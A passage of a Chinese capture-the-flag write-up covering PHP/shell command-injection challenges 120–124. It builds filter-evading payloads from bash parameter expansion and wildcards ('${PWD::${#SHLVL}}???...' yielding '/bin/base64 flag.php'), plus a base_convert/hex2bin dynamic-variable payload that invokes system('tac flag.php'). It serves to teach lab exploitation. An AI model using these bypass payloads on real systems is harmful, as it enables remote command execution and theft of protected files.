   > ${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?????${#RANDOM} ????.???
   > /bin/base64 flag.php
   > ```



## 120

> 长度不能超过65
>

PHP_CTLAGS=-fstack-protectxxxxxx64
PHP_VERSION=7.3.22
SHLVL=2（深度，默认为1）

构造指令 `/bin/base64 flag.php`

```
${PWD::${#SHLVL}} = / ; 
${#RANDOM}取生成随机数的长度,只要是四位数就能得到base64的flag
${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?????${#RANDOM} ????.???
```



## 121

> 禁用了SHLVL

>  `$?`表示上次命令执行结果，0为成功，非0为不正常

 把SHLVL替换为：`#?`

```
 ${PWD::${#?}}???${PWD::${#?}}?????${#RANDOM} ????.???
```



## 122

> pwd和#被ban

找其他的`/`开头的，如`home`

`#`不加也没关系，只是降低了概率
通过`$?`来实现，`$?是表示上一条命令执行结束后的传回值。通常0代表执行成功，非0代表执行有误`

```
${HOME::$?}???${HOME::$?}?????${RANDOM::$?} ????.???
```



## 124-动态变量解析

类似[CISCN 2019 ]Love Math,动态变量解析

> scandir() ：返回指定目录中的文件和目录的数组
> base_convert() ：在任意进制之间转换数字
> dechex() ：把十进制转换为十六进制
> hex2bin() ：把十六进制值的字符串转换为 ASCII 字符
> var_dump() ：函数用于输出变量的相关信息
> readfile() ：输出一个文件。读入一个文件并写入到输出缓冲。成功，则返 回从文件中读入的字节数。失败，则返回 false。

可以通过 `@readfile()` 形式调用该函数来隐藏错误信息；语法：`readfile(filename,include_path,context)`

通过c进行get传参，不能包含blacklist里面的字符，并且不能有whitelis以外的字符,这里可以通过将函数名转为10进制，再通过白名单内的函数转回函数名，执行相应代码

```
base_convert(37907361743,10,36) => "hex2bin"
dechex(1598506324) => "5f474554"
$pi=hex2bin("5f474554") => $pi="_GET"   //16进制数转换为二进制字符串
($$pi){pi}(($$pi){abs}) => ($_GET){pi}($_GET){abs}  //{}可代替[]
```

最终payload：

```
$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&pi=system&abs=tac flag.php
```

